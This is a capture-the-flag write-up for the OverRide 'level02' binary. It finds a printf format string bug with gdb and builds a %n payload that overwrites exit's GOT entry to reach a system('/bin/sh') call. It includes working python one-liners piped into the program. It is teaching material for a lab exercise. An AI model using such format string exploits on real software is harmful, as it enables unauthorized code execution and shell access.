Level02
-------


1) Running the program

level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: aaaaa
--[ Password: aaaaa
*****************************************
aaaaa does not have access!


from this we can see that the program asks for a Username & Password

2) Checking the code 

After checking the lines :

   0x0000000000400898 <+132>:	mov    $0x400bb0,%edx
   0x000000000040089d <+137>:	mov    $0x400bb2,%eax
   0x00000000004008a2 <+142>:	mov    %rdx,%rsi
   0x00000000004008a5 <+145>:	mov    %rax,%rdi
   0x00000000004008a8 <+148>:	callq  0x400700 <fopen@plt>


(gdb) x/s 0x400bb0
0x400bb0:	 "r"
(gdb) x/s 0x400bb2
0x400bb2:	 "/home/users/level03/.pass"

We can see that the program calls : fopen("/home/users/level03/.pass", "r")


3) Identify the vulnerability

   0x0000000000400aa2 <+654>:	callq  0x4006c0 <printf@plt>

This means printf(username);
instead of printf("%s", username);

That's a format string vulnerability

4) %n

%n is the most dangerous format specifier.

Instead of printing something, it: writes the number of printed characters into a memory address

Example: printf("AAAA%n", &x)
Result: x = 4

So %n allows arbitrary memory writes.


level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p 
--[ Password: aaaa
*****************************************
0x7fffffffe500 (nil) 0x61 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x61616161  does not have access!

The argument 8 contains data from our input 
From this we can say that gument 8 points to memory we control

5) Now let's find a target to overwrite 

We want to redirect program execution.

if we take a look at the failure path: 

   printf(username);
   puts(" does not have access!");
   exit(1);

The program calls exit() after printf(). so if we overwrite exit() address, we control execution.

6) Let's find the addresse of exit()

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:	jmpq   *0x200b12(%rip)        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:	pushq  $0xa
   0x000000000040071b <+11>:	jmpq   0x400660

The exit() address is storeed at 0x601228 

Overwriting this address will allow us to control where exit jumps.


7) Let's find the addresse of system("/bin/sh")

From disassembly:

   0x400a85 <main+625>: mov edi,0x400d32
   0x400a8a <main+630>: call system@plt

This calls:

system("/bin/sh")
So we redirect execution to: 0x400a85

8) Convert address of system("/bin/sh") to decimal

0x400a85 = 4196997 in decimal

9) Creation of the format string 

%4196997 this will print 4196997 characters 

%8$n  write the number of printed characters to argument #8

so %4196997d%8$n

10) Let's put the target address on the stack

0x601228 = \x28\x12\x60

11) The solution 

(python -c 'print "%4196997d" + "%8$n"' ; python -c 'print "\x28\x12\x60"'; cat) | ./level02


(python -c 'print "%4196997d%8$n\n\x28\x12\x60"'; cat) | ./level02

USER INPUT
     │
     ▼
printf(username)  ← format string
     │
     ▼
%4196997d → prints characters
%8$n      → writes value
     │
     ▼
overwrite exit@got (0x601228)
     │
     ▼
exit() called
     │
     ▼
jump → 0x400a85
     │
     ▼
system("/bin/sh")